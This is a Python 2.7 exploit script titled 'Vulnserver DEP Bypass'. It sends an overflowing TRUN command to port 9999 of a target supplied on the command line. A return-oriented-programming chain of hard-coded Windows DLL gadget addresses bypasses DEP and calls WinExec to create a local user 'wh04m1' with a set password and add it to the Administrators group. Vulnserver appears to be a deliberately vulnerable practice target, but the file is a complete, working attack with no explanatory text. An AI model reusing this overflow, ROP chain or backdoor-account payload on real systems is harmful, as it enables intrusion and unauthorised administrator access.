#!/usr/bin/python2.7
#Author: Wh04m1
#Name: Vulnserver DEP Bypass


import socket
from struct import pack
import sys

ip = str(sys.argv[1])
port = 9999

def p32(x):
	return pack("<L", x)

junk = "TRUN ." + "A" * 2006
cmd = 'cmd /c "net user wh04m1 H1Blu3T3am! /add && net localgroup Administrators wh04m1 /add"\x00'

pop_all = p32(0x62501729) # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [essfunc.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ}
pushad = p32(0x77a827c4) # PUSHAD # RETN [ntdll.dll] 
inc_ebx = p32(0x76e7dbc4) # : inc ebx |  {PAGE_EXECUTE_READ} [MSCTF.dll] ASLR: True, Rebase: True, SafeSEH: True, OS: True, v6.1.7600.16385 (C:\Windows\system32\MSCTF.dll)
winexec= p32(0x76fce5fd) # arwin.exe kernel32.dll WinExec
retn = p32(0x75f14804)  #RETN (ROP NOP) [user32.dll]

payload = pop_all
payload += p32(0xFFFFFFFF)
payload += winexec
payload += retn
payload += p32(0xFFFFFFFF)
payload += inc_ebx
payload += pushad
payload += cmd





s = socket.socket()
s.connect((ip,port))
s.send(junk + payload)
s.recv(1024)
s.close()
